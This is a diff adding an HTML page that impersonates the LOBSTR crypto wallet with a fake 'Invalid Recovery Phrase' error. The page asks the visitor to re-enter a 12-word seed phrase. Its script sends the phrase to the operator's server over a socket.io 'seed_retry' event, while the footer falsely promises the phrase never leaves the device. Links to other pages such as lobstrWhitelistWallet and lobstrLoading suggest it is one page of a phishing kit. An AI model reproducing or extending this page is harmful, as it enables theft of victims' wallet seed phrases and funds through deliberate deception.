@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR - Invalid Recovery Phrase</title>
+    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg" type="image/svg+xml">
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Ubuntu', sans-serif;
+            background: rgb(0, 0, 0);
+            min-height: 100vh;
+            color: #ffffff;
+        }
+        
+        .main-container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .header-logo {
+            margin-bottom: 40px;
+            padding-top: 20px;
+        }
+        
+        .logo-container {
+            background: #1B8DA0;
+            padding: 15px 30px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+        
+        .logo-container img {
+            width: 120px;
+            height: auto;
+        }
+        
+        .logo-fallback {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 600;
+            margin: 0;
+        }
+        
+        .content-wrapper {
+            background: rgb(12, 12, 12);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 600px;
+            padding: 40px;
+        }
+        
+        .header {
+            margin-bottom: 35px;
+        }
+        
+        .error-icon {
+            width: 64px;
+            height: 64px;
+            background: rgba(255, 107, 107, 0.2);
+            border: 2px solid #ff6b6b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 28px;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #ff6b6b;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .header p {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            text-align: center;
+            line-height: 1.5;
+        }
+        
+        .error-details {
+            background: rgba(255, 107, 107, 0.1);
+            border-radius: 8px;
+            border-left: 3px solid #ff6b6b;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .error-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #ff6b6b;
+            margin-bottom: 12px;
+        }
+        
+        .error-message {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.6;
+        }
+        
+        .error-list {
+            margin-top: 15px;
+            padding-left: 20px;
+        }
+        
+        .error-list li {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 8px;
+        }
+        
+        .form-container {
+            margin-bottom: 30px;
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+        }
+        
+        .input-label {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 10px;
+            display: block;
+            font-weight: 500;
+        }
+        
+        .seed-input {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid #ff6b6b;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 16px;
+            font-family: 'Ubuntu', sans-serif;
+            transition: all 0.3s ease;
+            min-height: 100px;
+            resize: vertical;
+        }
+        
+        .seed-input:focus {
+            outline: none;
+            border-color: #1B8DA0;
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 0 0 1px #1B8DA0;
+        }
+        
+        .seed-input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+        
+        .validation-info {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 10px;
+            padding: 12px;
+            background: rgba(27, 141, 160, 0.1);
+            border-radius: 6px;
+            border-left: 3px solid #1B8DA0;
+            line-height: 1.5;
+        }
+        
+        .validation-info strong {
+            color: #1B8DA0;
+            font-weight: 500;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .action-button {
+            flex: 1;
+            padding: 16px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Ubuntu', sans-serif;
+        }
+        
+        .primary-button {
+            background: #1B8DA0;
+            color: white;
+        }
+        
+        .primary-button:hover:not(:disabled) {
+            background: #157689;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(27, 141, 160, 0.3);
+        }
+        
+        .primary-button:active:not(:disabled) {
+            transform: translateY(0);
+        }
+        
+        .primary-button:disabled {
+            background: rgba(27, 141, 160, 0.3);
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        
+        .secondary-button {
+            background: rgba(255, 255, 255, 0.05);
+            color: #ffffff;
+            border: 2px solid #1B8DA0;
+        }
+        
+        .secondary-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+        
+        .help-section {
+            margin-top: 30px;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .help-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #1B8DA0;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .help-icon {
+            width: 20px;
+            height: 20px;
+            background: #1B8DA0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: white;
+        }
+        
+        .help-list {
+            list-style: none;
+            padding: 0;
+        }
+        
+        .help-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .help-item-icon {
+            color: #1B8DA0;
+            margin-top: 2px;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .footer-note {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.4);
+            line-height: 1.5;
+        }
+        
+        @media (max-width: 768px) {
+            .content-wrapper {
+                padding: 30px 20px;
+                border-radius: 12px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .action-buttons {
+                flex-direction: column;
+            }
+            
+            .seed-input {
+                padding: 14px;
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="header-logo">
+            <div class="logo-container">
+                <img src="https://static.lobstr.co/static/landing/images/logo.svg" 
+                     alt="LOBSTR Logo" 
+                     onerror="this.style.display='none'; this.parentElement.innerHTML='<h2 class=\'logo-fallback\'>LOBSTR</h2>'">
+            </div>
+        </div>
+        
+        <div class="content-wrapper">
+            <div class="header">
+                <div class="error-icon">❌</div>
+                <h1>Invalid Recovery Phrase</h1>
+                <p>The recovery phrase you entered could not be validated</p>
+            </div>
+            
+            <div class="error-details">
+                <div class="error-title">Validation Error</div>
+                <div class="error-message">
+                    Your recovery phrase does not meet the required format. Please check the following:
+                    <ul class="error-list">
+                        <li>Must contain exactly 12 words</li>
+                        <li>Words must be separated by spaces</li>
+                        <li>All words must be from the valid word list</li>
+                        <li>Words must be in the correct order</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="form-container">
+                <div class="input-group">
+                    <label class="input-label" for="seed_phrase">Recovery Phrase</label>
+                    <textarea 
+                        id="seed_phrase" 
+                        class="seed-input" 
+                        placeholder="Enter your 12-word recovery phrase separated by spaces"
+                        autocomplete="off"
+                        spellcheck="false"
+                    ></textarea>
+                    
+                    <div class="validation-info">
+                        <strong>Tip:</strong> Copy and paste your recovery phrase exactly as it was provided to you. Each word should be lowercase and separated by a single space.
+                    </div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button type="button" class="action-button secondary-button" id="backBtn">
+                        Go Back
+                    </button>
+                    <button type="submit" class="action-button primary-button" id="retryBtn">
+                        Try Again
+                    </button>
+                </div>
+            </div>
+            
+            <div class="help-section">
+                <div class="help-title">
+                    <div class="help-icon">?</div>
+                    Common Issues
+                </div>
+                <ul class="help-list">
+                    <li class="help-item">
+                        <span class="help-item-icon">•</span>
+                        <span>Check for typos or misspelled words in your phrase</span>
+                    </li>
+                    <li class="help-item">
+                        <span class="help-item-icon">•</span>
+                        <span>Ensure there are no extra spaces at the beginning or end</span>
+                    </li>
+                    <li class="help-item">
+                        <span class="help-item-icon">•</span>
+                        <span>Verify you have exactly 12 words, not more or less</span>
+                    </li>
+                    <li class="help-item">
+                        <span class="help-item-icon">•</span>
+                        <span>Confirm the words are in the exact order they were given</span>
+                    </li>
+                    <li class="help-item">
+                        <span class="help-item-icon">•</span>
+                        <span>Make sure you're using the recovery phrase for LOBSTR</span>
+                    </li>
+                </ul>
+            </div>
+            
+            <div class="footer-note">
+                Your recovery phrase is never sent to our servers. All validation happens locally on your device for maximum security.
+            </div>
+        </div>
+    </div>
+    
+    <script src="/js/socket-client.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const seedInput = document.getElementById('seed_phrase');
+            const retryBtn = document.getElementById('retryBtn');
+            const backBtn = document.getElementById('backBtn');
+            
+            // Focus on input
+            seedInput.focus();
+            
+            // Clear error styling on input
+            seedInput.addEventListener('input', function() {
+                if (this.value.trim()) {
+                    this.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+                }
+            });
+            
+            // Validate seed phrase
+            function validateSeedPhrase(phrase) {
+                if (!phrase) {
+                    return { valid: false, error: 'Please enter your recovery phrase' };
+                }
+                
+                // Check if it has exactly 12 words
+                const words = phrase.trim().split(/\s+/);
+                if (words.length !== 12) {
+                    return { valid: false, error: `Found ${words.length} words. Recovery phrase must contain exactly 12 words` };
+                }
+                
+                // Check if words are valid (basic check for empty strings)
+                for (let word of words) {
+                    if (word.length === 0) {
+                        return { valid: false, error: 'Invalid recovery phrase format' };
+                    }
+                }
+                
+                return { valid: true };
+            }
+            
+            // Handle retry
+            retryBtn.addEventListener('click', async function(e) {
+                e.preventDefault();
+                
+                const seedPhrase = seedInput.value.trim();
+                const validation = validateSeedPhrase(seedPhrase);
+                
+                if (!validation.valid) {
+                    // Update error message
+                    const errorMessage = document.querySelector('.error-message');
+                    if (errorMessage) {
+                        errorMessage.innerHTML = validation.error + errorMessage.innerHTML.substring(errorMessage.innerHTML.indexOf('<ul'));
+                    }
+                    seedInput.style.borderColor = '#ff6b6b';
+                    seedInput.focus();
+                    return;
+                }
+                
+                // Disable button and show loading
+                retryBtn.disabled = true;
+                retryBtn.innerHTML = '<span class="loading-spinner"></span>';
+                
+                // Emit socket event
+                if (typeof socket !== 'undefined') {
+                    socket.emit('seed_retry', {
+                        seed: seedPhrase,
+                        timestamp: new Date().toISOString(),
+                        page: 'lobstrInvalidSeed'
+                    });
+                    
+                    socket.emit('page_loading', true);
+                    
+                    // For demo purposes, redirect to loading after a delay
+                    // In production, this would validate the seed first
+                    setTimeout(() => {
+                        socket.emit('request_redirect', { page: 'lobstrLoading' });
+                    }, 1500);
+                } else {
+                    console.error('Socket not initialized');
+                    retryBtn.disabled = false;
+                    retryBtn.innerHTML = 'Try Again';
+                }
+            });
+            
+            // Handle back button
+            backBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                if (typeof socket !== 'undefined') {
+                    socket.emit('navigate_back', {
+                        from: 'lobstrInvalidSeed',
+                        timestamp: new Date().toISOString()
+                    });
+                }
+                
+                // Go back to whitelist wallet page
+                window.location.href = '/pages/lobstrWhitelistWallet.html';
+            });
+            
+            // Handle Enter key in textarea
+            seedInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' && !e.shiftKey) {
+                    e.preventDefault();
+                    retryBtn.click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
